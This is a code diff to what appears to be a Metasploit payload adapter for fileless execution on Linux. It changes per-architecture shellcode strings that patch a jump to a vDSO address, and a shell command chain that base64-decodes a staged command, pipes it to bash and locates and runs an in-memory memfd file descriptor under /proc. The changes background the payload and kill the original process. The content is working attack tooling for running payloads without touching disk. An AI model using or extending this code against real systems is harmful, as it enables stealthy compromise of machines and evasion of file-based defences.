@@ -185,8 +185,6 @@ module Msf::Payload::Adapter::Fetch::Fileless
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
     return payload
-    #payload.unpack("H*")[0]
-    #Base64.strict_encode64(payload).gsub(/\n/, '')
   end
  
   def _generate_jmp_instruction_sh(arch)
@@ -205,14 +203,28 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
     
     case arch
+    
     when 'x64'
       %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+    
     when 'x86'
       %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+    
+    # ARM64 shellcode
+    # ldr x0, #8
+    # br x0
     when 'aarch64'
       %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+    
+    # ARMle shelcode
+    # ldr.w r2, [pc, #4]
+    # bx    r2 
     when 'armle'
       %^"dff804201047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+    
+    # ARMbe shelcode
+    # ldr.w r2, [pc, #4]
+    # bx    r2 
     when 'armbe'
       %^"f8df20044710"$(echo $(printf %04x $vdso_addr))^
     
@@ -231,6 +243,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # jr $t2
     when 'mipsbe'
       %^"0411000000000000014a50268fea00100140000800000000"$(echo (printf %04x $vdso_addr))^
+    
     # MIPS64 shellcode
     # bgezal $zero, 4
     # xor $t2, $t2,$t2
@@ -247,6 +260,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # blr
     when 'ppc'
      %^"480000057e4802a6807200107c6803a64e800020"$(echo $(printf %04x $vdso_addr))^ 
+    
     # PPC64 shellcode
     # bl 4
     # mflr 18
@@ -288,17 +302,19 @@ module Msf::Payload::Adapter::Fetch::Fileless
 
     cmd = "echo -n '#{Base64.strict_encode64(stage_cmd).gsub(/\n/, '')}' | base64 -d | bash & "
     cmd << 'cd /proc/$!;'
+    cmd << 'og_process=$!;'
     cmd << 'sleep 2;' #adding short pause to give process time to load file handle
     cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'
 
     cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
     cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
     cmd << "then if $(#{get_file_cmd} >/dev/null);"
-    cmd << 'then $f;FOUND=1;break;'
+    cmd << 'then $f&;FOUND=1;break;'
     cmd << 'fi;'
     cmd << 'fi;'
     cmd << 'done;'
     cmd << 'fi;'
+    cmd << 'kill -9 $og_process;'
   end
   
   # same idea as _generate_fileless function, but force creating anonymous file handle
